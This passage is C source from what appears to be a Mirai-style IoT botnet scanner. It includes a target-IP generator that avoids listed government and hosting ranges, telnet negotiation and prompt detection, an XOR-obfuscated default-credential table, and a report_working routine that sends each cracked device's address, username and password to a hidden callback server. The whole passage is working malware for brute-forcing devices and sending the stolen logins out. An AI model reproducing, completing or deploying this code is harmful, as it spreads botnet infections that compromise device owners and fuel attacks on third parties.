          (o1 == 80 && o2 == 235) ||                           //Some more
          (o1 == 207 && o2 == 120) ||                          //Some more
          (o1 == 209 && o2 == 35) ||                           //Some more
          (o1 == 64 && o2 == 70) ||                            //Some more
          (o1 == 64 && o2 >= 69 && o2 < 227) ||                //Some more
          (o1 == 128 && o2 >= 35 && o2 < 237) ||               //Some more
          (o1 == 129 && o2 >= 22 && o2 < 255) ||               //Some more
          (o1 == 130 && o2 >= 40 && o2 < 168) ||               //Some more
          (o1 == 131 && o2 >= 3 && o2 < 251) ||                //Some more
          (o1 == 132 && o2 >= 3 && o2 < 251) ||                //Some more
          (o1 == 134 && o2 >= 5 && o2 < 235) ||                //Some more
          (o1 == 136 && o2 >= 177 && o2 < 223) ||              //Some more
          (o1 == 138 && o2 >= 13 && o2 < 194) ||               //Some more
          (o1 == 139 && o2 >= 31 && o2 < 143) ||               //Some more
          (o1 == 140 && o2 >= 1 && o2 < 203) ||                //Some more
          (o1 == 143 && o2 >= 45 && o2 < 233) ||               //Some more
          (o1 == 144 && o2 >= 99 && o2 < 253) ||               //Some more
          (o1 == 146 && o2 >= 165 && o2 < 166) ||              //Some more
          (o1 == 147 && o2 >= 35 && o2 < 43) ||                //Some more
          (o1 == 147 && o2 >= 103 && o2 < 105) ||              //Some more
          (o1 == 147 && o2 >= 168 && o2 < 170) ||              //Some more
          (o1 == 147 && o2 >= 198 && o2 < 200) ||              //Some more
          (o1 == 147 && o2 >= 238 && o2 < 255) ||              //Some more
          (o1 == 150 && o2 >= 113 && o2 < 115) ||              //Some more
          (o1 == 152 && o2 >= 151 && o2 < 155) ||              //Some more
          (o1 == 153 && o2 >= 21 && o2 < 32) ||                //Some more
          (o1 == 155 && o2 >= 5 && o2 < 10) ||                 //Some more
          (o1 == 155 && o2 >= 74 && o2 < 89) ||                //Some more
          (o1 == 155 && o2 >= 213 && o2 < 222) ||              //Some more
          (o1 == 157 && o2 >= 150 && o2 < 154) ||              //Some more
          (o1 == 158 && o2 >= 1 && o2 < 21) ||                 //Some more
          (o1 == 158 && o2 >= 235 && o2 < 247) ||              //Some more
          (o1 == 159 && o2 >= 120 && o2 < 121) ||              //Some more
          (o1 == 160 && o2 >= 132 && o2 < 151) ||              //Some more
          (o1 == 64 && o2 >= 224 && o2 < 227) ||               //Some more
          (o1 == 162 && o2 >= 45 && o2 < 47) ||                //CIA 
          (o1 == 163 && o2 >= 205 && o2 < 207) ||              //NASA Kennedy Space Center
          (o1 == 164 && o2 >= 45 && o2 < 50) ||                //NASA Kennedy Space Center
          (o1 == 164 && o2 >= 217 && o2 < 233) ||              //NASA Kennedy Space Center
          (o1 == 169 && o2 >= 252 && o2 < 254) ||              //U.S. Department of State
          (o1 == 199 && o2 >= 121 && o2 < 254) ||              //Naval Air Systems Command, VA
          (o1 == 205 && o2 >= 1 && o2 < 118) ||                //Department of the Navy, Space and Naval Warfare System Command, Washington DC - SPAWAR
          (o1 == 207 && o2 >= 60 && o2 < 62) ||                //FBI controlled Linux servers & IPs/IP-Ranges
          (o1 == 104 && o2 >= 16 && o2 < 31) ||                //Cloudflare
          (o1 == 188 && o2 == 166) ||                          //Digital Ocean
          (o1 == 188 && o2 == 226) ||                          //Digital Ocean
          (o1 == 159 && o2 == 203) ||                          //Digital Ocean
          (o1 == 162 && o2 == 243) ||                          //Digital Ocean
          (o1 == 45 && o2 == 55) ||                            //Digital Ocean
          (o1 == 178 && o2 == 62) ||                           //Digital Ocean
          (o1 == 104 && o2 == 131) ||                          //Digital Ocean
          (o1 == 104 && o2 == 236) ||                          //Digital Ocean
          (o1 == 107 && o2 == 170) ||                          //Digital Ocean
          (o1 == 138 && o2 == 197) ||                          //Digital Ocean
          (o1 == 138 && o2 == 68) ||                           //Digital Ocean
          (o1 == 139 && o2 == 59) ||                           //Digital Ocean
          (o1 == 146 && o2 == 185 && o3 >= 128 && o3 < 191) || //Digital Ocean
          (o1 == 163 && o2 == 47 && o3 >= 10 && o3 < 11) ||    //Digital Ocean
          (o1 == 174 && o2 == 138 && o3 >= 1 && o3 < 127) ||   //Digital Ocean
          (o1 == 192 && o2 == 241 && o3 >= 128 && o3 < 255) || //Digital Ocean
          (o1 == 198 && o2 == 199 && o3 >= 64 && o3 < 127) ||  //Digital Ocean
          (o1 == 198 && o2 == 211 && o3 >= 96 && o3 < 127) ||  //Digital Ocean
          (o1 == 207 && o2 == 154 && o3 >= 192 && o3 < 255) || //Digital Ocean
          (o1 == 37 && o2 == 139 && o3 >= 1 && o3 < 31) ||     //Digital Ocean
          (o1 == 67 && o2 == 207 && o3 >= 64 && o3 < 95) ||    //Digital Ocean
          (o1 == 67 && o2 == 205 && o3 >= 128 && o3 < 191) ||  //Digital Ocean
          (o1 == 80 && o2 == 240 && o3 >= 128 && o3 < 143) ||  //Digital Ocean
          (o1 == 82 && o2 == 196 && o3 >= 1 && o3 < 15) ||     //Digital Ocean
          (o1 == 95 && o2 == 85 && o3 >= 8 && o3 < 63) ||      //Digital Ocean
          (o1 == 64 && o2 == 237 && o3 >= 32 && o3 < 43) ||    //Choopa & Vultr
          (o1 == 185 && o2 == 92 && o3 >= 220 && o3 < 223) ||  //Choopa & Vultr
          (o1 == 104 && o2 == 238 && o3 >= 128 && o3 < 191) || //Choopa & Vultr
          (o1 == 209 && o2 == 222 && o3 >= 1 && o3 < 31) ||    //Choopa & Vultr
          (o1 == 208 && o2 == 167 && o3 >= 232 && o3 < 252) || //Choopa & Vultr
          (o1 == 66 && o2 == 55 && o3 >= 128 && o3 < 159) ||   //Choopa & Vultr
          (o1 == 45 && o2 == 63 && o3 >= 1 && o3 < 127) ||     //Choopa & Vultr
          (o1 == 216 && o2 == 237 && o3 >= 128 && o3 < 159) || //Choopa & Vultr
          (o1 == 108 && o2 == 61) ||                           //Choopa & Vultr
          (o1 == 45 && o2 == 76) ||                            //Choopa & Vultr
          (o1 == 185 && o2 == 11 && o3 >= 144 && o3 < 148) ||  //Blazingfast & Nforce
          (o1 == 185 && o2 == 56 && o3 >= 21 && o3 < 23) ||    //Blazingfast & Nforce
          (o1 == 185 && o2 == 61 && o3 >= 136 && o3 < 139) ||  //Blazingfast & Nforce
          (o1 == 185 && o2 == 62 && o3 >= 187 && o3 < 191) ||  //Blazingfast & Nforce
          (o1 == 66 && o2 == 150 && o3 >= 120 && o3 < 215) ||  //Blazingfast & Nforce
          (o1 == 66 && o2 == 151 && o3 >= 137 && o3 < 139) ||  //Blazingfast & Nforce
          (o1 == 64 && o2 == 94 && o3 >= 237 && o3 < 255) ||   //Blazingfast & Nforce
          (o1 == 63 && o2 == 251 && o3 >= 19 && o3 < 21) ||    //Blazingfast & Nforce
          (o1 == 70 && o2 == 42 && o3 >= 73 && o3 < 75) ||     //Blazingfast & Nforce
          (o1 == 74 && o2 == 91 && o3 >= 113 && o3 < 115) ||   //Blazingfast & Nforce
          (o1 == 74 && o2 == 201 && o3 >= 56 && o3 < 58) ||    //Blazingfast & Nforce
          (o1 == 188 && o2 == 209 && o3 >= 48 && o3 < 53) ||   //Blazingfast & Nforce
          (o1 == 188 && o2 == 165) ||                          //OVH
          (o1 == 149 && o2 == 202) ||                          //OVH
          (o1 == 151 && o2 == 80) ||                           //OVH
          (o1 == 164 && o2 == 132) ||                          //OVH
          (o1 == 176 && o2 == 31) ||                           //OVH
          (o1 == 167 && o2 == 114) ||                          //OVH
          (o1 == 178 && o2 == 32) ||                           //OVH
          (o1 == 178 && o2 == 33) ||                           //OVH
          (o1 == 37 && o2 == 59) ||                            //OVH
          (o1 == 37 && o2 == 187) ||                           //OVH
          (o1 == 46 && o2 == 105) ||                           //OVH
          (o1 == 51 && o2 == 254) ||                           //OVH
          (o1 == 51 && o2 == 255) ||                           //OVH
          (o1 == 5 && o2 == 135) ||                            //OVH
          (o1 == 5 && o2 == 196) ||                            //OVH
          (o1 == 5 && o2 == 39) ||                             //OVH
          (o1 == 91 && o2 == 134) ||                           //OVH
          (o1 == 104 && o2 == 200 && o3 >= 128 && o3 < 159) || //Total Server Solutions
          (o1 == 107 && o2 == 152 && o3 >= 96 && o3 < 111) ||  //Total Server Solutions
          (o1 == 107 && o2 == 181 && o3 >= 160 && o3 < 189) || //Total Server Solutions
          (o1 == 172 && o2 == 98 && o3 >= 64 && o3 < 95) ||    //Total Server Solutions
          (o1 == 184 && o2 == 170 && o3 >= 240 && o3 < 255) || //Total Server Solutions
          (o1 == 192 && o2 == 111 && o3 >= 128 && o3 < 143) || //Total Server Solutions
          (o1 == 192 && o2 == 252 && o3 >= 208 && o3 < 223) || //Total Server Solutions
          (o1 == 192 && o2 == 40 && o3 >= 56 && o3 < 59) ||    //Total Server Solutions
          (o1 == 198 && o2 == 8 && o3 >= 81 && o3 < 95) ||     //Total Server Solutions
          (o1 == 199 && o2 == 116 && o3 >= 112 && o3 < 119) || //Total Server Solutions
          (o1 == 199 && o2 == 229 && o3 >= 248 && o3 < 255) || //Total Server Solutions
          (o1 == 199 && o2 == 36 && o3 >= 220 && o3 < 223) ||  //Total Server Solutions
          (o1 == 199 && o2 == 58 && o3 >= 184 && o3 < 187) ||  //Total Server Solutions
          (o1 == 206 && o2 == 220 && o3 >= 172 && o3 < 175) || //Total Server Solutions
          (o1 == 208 && o2 == 78 && o3 >= 40 && o3 < 43) ||    //Total Server Solutions
          (o1 == 208 && o2 == 93 && o3 >= 192 && o3 < 193) ||  //Total Server Solutions
          (o1 == 66 && o2 == 71 && o3 >= 240 && o3 < 255) ||   //Total Server Solutions
          (o1 == 98 && o2 == 142 && o3 >= 208 && o3 < 223) ||  //Total Server Solutions
          (o1 == 107 && o2 >= 20 && o2 < 24) ||                //Amazon
          (o1 == 35 && o2 >= 159 && o2 < 183) ||               //Amazon
          (o1 == 52 && o2 >= 1 && o2 < 95) ||                  //Amazon
          (o1 == 52 && o2 >= 95 && o2 < 255) ||                //Amazon + Microsoft
          (o1 == 54 && o2 >= 64 && o2 < 95) ||                 //Amazon + Microsoft
          (o1 == 54 && o2 >= 144 && o2 < 255) ||               //Amazon + Microsoft
          (o1 == 13 && o2 >= 52 && o2 < 60) ||                 //Amazon + Microsoft
          (o1 == 13 && o2 >= 112 && o2 < 115) ||               //Amazon + Microsoft
          (o1 == 163 && o2 == 172) ||                          //ONLINE SAS
          (o1 == 51 && o2 >= 15 && o2 < 255) ||                //ONLINE SAS
          (o1 == 79 && o2 == 121 && o3 >= 128 && o3 < 255) ||  //Some more
          (o1 == 212 && o2 == 47 && o3 >= 224 && o3 < 255) ||  //Some more
          (o1 == 89 && o2 == 34 && o3 >= 96 && o3 < 97) ||     //Some more
          (o1 == 219 && o2 >= 216 && o2 < 231) ||              //Some more
          (o1 == 23 && o2 >= 94 && o2 < 109) ||                //Some more
          (o1 == 178 && o2 >= 62 && o2 < 63) ||                //Some more
          (o1 == 106 && o2 >= 182 && o2 < 189) ||              //Some more
          (o1 == 106 && o2 >= 184) ||                          //Some more
          (o1 == 34 && o2 >= 245 && o2 < 255) ||               //Some more
          (o1 == 87 && o2 >= 97 && o2 < 99) ||                 //Some more
          (o1 == 86 && o2 == 208) ||                           //Some more
          (o1 == 86 && o2 == 209) ||                           //Some more
          (o1 == 193 && o2 == 164) ||                          //Some more
          (o1 == 120 && o2 >= 103 && o2 < 108) ||              //Ministry of Education Computer Science
          (o1 == 188 && o2 == 68) ||                           //Ministry of Education Computer Science
          (o1 == 78 && o2 == 46) ||                            //Ministry of Education Computer Science
          (o1 >= 224) ||                                       //Multicast
          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
    );

    return INET_ADDR(o1,o2,o3,o4);
}

static int consume_iacs(struct scanner_connection *conn)
{
    int consumed = 0;
    uint8_t *ptr = conn->rdbuf;

    while (consumed < conn->rdbuf_pos)
    {
        int i;

        if (*ptr != 0xff)
            break;
        else if (*ptr == 0xff)
        {
            if (!can_consume(conn, ptr, 1))
                break;
            if (ptr[1] == 0xff)
            {
                ptr += 2;
                consumed += 2;
                continue;
            }
            else if (ptr[1] == 0xfd)
            {
                uint8_t tmp1[3] = {255, 251, 31};
                uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};

                if (!can_consume(conn, ptr, 2))
                    break;
                if (ptr[2] != 31)
                    goto iac_wont;

                ptr += 3;
                consumed += 3;

                send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
                send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
            }
            else
            {
                iac_wont:

                if (!can_consume(conn, ptr, 2))
                    break;

                for (i = 0; i < 3; i++)
                {
                    if (ptr[i] == 0xfd)
                        ptr[i] = 0xfc;
                    else if (ptr[i] == 0xfb)
                        ptr[i] = 0xfd;
                }

                send(conn->fd, ptr, 3, MSG_NOSIGNAL);
                ptr += 3;
                consumed += 3;
            }
        }
    }

    return consumed;
}

static int consume_any_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_user_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
    {
        int tmp, len;
        char *ogin, *enter;

        table_unlock_val(TABLE_SCAN_OGIN);
        table_unlock_val(TABLE_SCAN_ENTER);

        ogin = table_retrieve_val(TABLE_SCAN_OGIN, &len);
        enter = table_retrieve_val(TABLE_SCAN_ENTER, &len);

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, ogin, len - 1) != -1))
            prompt_ending = tmp;

        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, enter, len - 1) != -1))
            prompt_ending = tmp;

    }
        table_lock_val(TABLE_SCAN_OGIN);
        table_lock_val(TABLE_SCAN_ENTER);

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_pass_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
    {
        int tmp, len;
        char *assword;

        table_unlock_val(TABLE_SCAN_ASSWORD);

        assword = table_retrieve_val(TABLE_SCAN_ASSWORD, &len);

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, assword, len - 1) != -1))
            prompt_ending = tmp;
    }
        table_lock_val(TABLE_SCAN_ASSWORD);

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_resp_prompt(struct scanner_connection *conn)
{
    char *tkn_resp;
    int prompt_ending, len;

    table_unlock_val(TABLE_SCAN_NCORRECT);
    tkn_resp = table_retrieve_val(TABLE_SCAN_NCORRECT, &len);
    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1) != -1)
    {
        table_lock_val(TABLE_SCAN_NCORRECT);
        return -1;
    }
    table_lock_val(TABLE_SCAN_NCORRECT);

    table_unlock_val(TABLE_SCAN_RESP);
    tkn_resp = table_retrieve_val(TABLE_SCAN_RESP, &len);
    prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1);
    table_lock_val(TABLE_SCAN_RESP);

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static void add_auth_entry(char *enc_user, char *enc_pass, uint16_t weight)
{
    int tmp;

    auth_table = realloc(auth_table, (auth_table_len + 1) * sizeof (struct scanner_auth));
    auth_table[auth_table_len].username = deobf(enc_user, &tmp);
    auth_table[auth_table_len].username_len = (uint8_t)tmp;
    auth_table[auth_table_len].password = deobf(enc_pass, &tmp);
    auth_table[auth_table_len].password_len = (uint8_t)tmp;
    auth_table[auth_table_len].weight_min = auth_table_max_weight;
    auth_table[auth_table_len++].weight_max = auth_table_max_weight + weight;
    auth_table_max_weight += weight;
}

static struct scanner_auth *random_auth_entry(void)
{
    int i;
    uint16_t r = (uint16_t)(rand_next() % auth_table_max_weight);

    for (i = 0; i < auth_table_len; i++)
    {
        if (r < auth_table[i].weight_min)
            continue;
        else if (r < auth_table[i].weight_max)
            return &auth_table[i];
    }

    return NULL;
}

static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth)
{
    struct sockaddr_in addr;
    int pid = fork(), fd;
    struct resolv_entries *entries = NULL;

    if (pid > 0 || pid == -1)
        return;

    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("(telnetscanner/report) failed to call socket()\n");
#endif
        exit(0);
    }

    table_unlock_val(TABLE_SCAN_DOMAIN);
    table_unlock_val(TABLE_SCAN_CB_PORT);

    entries = resolv_lookup(table_retrieve_val(TABLE_SCAN_DOMAIN, NULL));
    if (entries == NULL)
    {
#ifdef DEBUG
        printf("(telnetscanner/report) failed to resolve report address\n");
#endif
        return;
    }
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    addr.sin_port = *((port_t *)table_retrieve_val(TABLE_SCAN_CB_PORT, NULL));
    resolv_entries_free(entries);
    table_lock_val(TABLE_SCAN_DOMAIN);
    table_lock_val(TABLE_SCAN_CB_PORT);

    if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
    {
#ifdef DEBUG
        printf("(telnetscanner/report) failed to connect to scanner callback!\n");
#endif
        close(fd);
        exit(0);
    }

    uint8_t zero = 0;
    send(fd, &zero, sizeof (uint8_t), MSG_NOSIGNAL);
    send(fd, &daddr, sizeof (ipv4_t), MSG_NOSIGNAL);
    send(fd, &dport, sizeof (uint16_t), MSG_NOSIGNAL);
    send(fd, &(auth->username_len), sizeof (uint8_t), MSG_NOSIGNAL);
    send(fd, auth->username, auth->username_len, MSG_NOSIGNAL);
    send(fd, &(auth->password_len), sizeof (uint8_t), MSG_NOSIGNAL);
    send(fd, auth->password, auth->password_len, MSG_NOSIGNAL);

#ifdef DEBUG
    printf("[report] Send scan result to loader\n");
#endif

    close(fd);
    exit(0);
}

static char *deobf(char *str, int *len)
{
    int i;
    char *cpy;

    *len = util_strlen(str);
    cpy = malloc(*len + 1);

    util_memcpy(cpy, str, *len + 1);

    for (i = 0; i < *len; i++)
    {
        cpy[i] ^= 0x13;
        cpy[i] ^= 0x37;
        cpy[i] ^= 0xC0;
        cpy[i] ^= 0xD3;
    }

    return cpy;
}

static BOOL can_consume(struct scanner_connection *conn, uint8_t *ptr, int amount)
{
    uint8_t *end = conn->rdbuf + conn->rdbuf_pos;

    return ptr + amount < end;
}
